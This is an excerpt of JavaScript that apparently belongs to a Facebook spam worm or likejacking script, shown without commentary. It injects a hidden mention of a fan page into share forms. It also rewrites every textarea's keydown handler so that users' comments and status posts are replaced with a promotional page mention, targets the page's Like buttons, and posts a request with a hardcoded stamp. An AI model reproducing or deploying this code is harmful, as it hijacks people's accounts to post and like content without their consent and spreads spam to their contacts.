...
if (document.URL.indexOf("sharer.php") >= 0) {
    ...
    document.forms.item(0).innerHTML += "<input type='hidden' autocomplete='off' class='mentionsHidden' name='message' value='@[176066372504137:Seyhun Sarıoglu FAN Page]'>"; 
...
for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
    document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[342148012477611:Begen + Paylas 1000 Abone Kazan.] ') < 0 && this.name == 'add_comment_text_text'){this.value = '@[342148012477611:Begen + Paylas 1000 Abone Kazan.] ';}");
}
document.addEventListener("click", function () {
    if (document.URL.indexOf("facebook.com/pages/Ünlü-Olmayan-Taşlar/342148012477611") >= 0 && document.URL.indexOf("sharer.php") < 0) {
        for (i = 0; i <= document.getElementById("mainbuttonspan").getElementsByTagName("input").length - 1; i++) {
            if (document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).value == "Beğen") {
                document.getElementById("mainbuttonspan").getElementsByTagName("input").item(i).id = "Begen"
            }
    ...
    for (i = 0; i <= document.getElementsByTagName("textarea").length - 1; i++) {
        document.getElementsByTagName("textarea").item(i).setAttribute("onkeydown", "if(this.value.indexOf('@[342148012477611:Begen + Paylas 1000 Abone Kazan.] ') < 0 && this.name == 'add_comment_text_text' || this.name == 'xhpc_message_text' && this.value.indexOf('@[342148012477611:Begen + Paylas 1000 Abone Kazan.] ') < 0){this.value = '@[342148012477611:Begen + Paylas 1000 Abone Kazan.] ';}");
    }
    ...
    params += "&phstamp=100003266922089";
    xmlhttp.send(params);
}, false);
